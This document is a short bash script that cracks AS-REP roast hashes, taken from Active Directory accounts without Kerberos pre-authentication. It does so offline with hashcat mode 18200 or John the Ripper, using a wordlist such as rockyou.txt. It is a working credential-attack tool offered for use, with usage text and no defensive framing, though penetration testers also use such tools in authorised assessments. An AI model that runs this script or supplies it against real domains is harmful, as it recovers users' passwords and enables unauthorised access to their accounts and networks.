#!/bin/bash
# AS-REP Hash Cracking Script
# Cracks AS-REP roast hashes using hashcat or john

set -e

if [ $# -lt 2 ]; then
    echo "Usage: $0 <hash_file> <wordlist> [tool]"
    echo "Example: $0 hashes.asreproast /usr/share/wordlists/rockyou.txt hashcat"
    echo "Tools: hashcat (default), john"
    exit 1
fi

HASH_FILE=$1
WORDLIST=$2
TOOL=${3:-hashcat}

if [ ! -f "$HASH_FILE" ]; then
    echo "[!] Hash file not found: $HASH_FILE"
    exit 1
fi

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist not found: $WORDLIST"
    exit 1
fi

echo "[*] Cracking AS-REP hashes..."
echo "[*] Hash file: $HASH_FILE"
echo "[*] Wordlist: $WORDLIST"
echo "[*] Tool: $TOOL"

case $TOOL in
    hashcat)
        echo "[*] Using hashcat (mode 18200 for AS-REP roast)"
        hashcat -m 18200 --force -a 0 "$HASH_FILE" "$WORDLIST"
        ;;
    john)
        echo "[*] Using John the Ripper"
        john --wordlist="$WORDLIST" "$HASH_FILE"
        echo "[*] To show cracked passwords: john --show $HASH_FILE"
        ;;
    *)
        echo "[!] Unknown tool: $TOOL"
        echo "[!] Use 'hashcat' or 'john'"
        exit 1
        ;;
esac

echo "[*] Cracking complete"
